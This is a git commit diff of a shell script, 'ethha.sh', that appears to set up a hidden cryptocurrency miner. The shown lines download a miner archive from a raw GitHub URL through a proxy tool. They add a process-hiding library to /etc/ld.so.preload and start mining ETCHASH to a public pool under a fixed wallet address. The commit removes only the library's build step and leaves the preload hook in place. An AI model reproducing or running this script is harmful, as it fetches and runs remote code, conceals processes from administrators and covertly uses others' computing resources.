da7a9ed780431a25effc8ee24ee885a1c98c9052
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-08 09:43:08 +0700

    Update ethha.sh

--- ethha.sh
+++ ethha.sh
@@ -46,8 +46,6 @@ chmod +x bezzHash
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 
-make
-mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
 
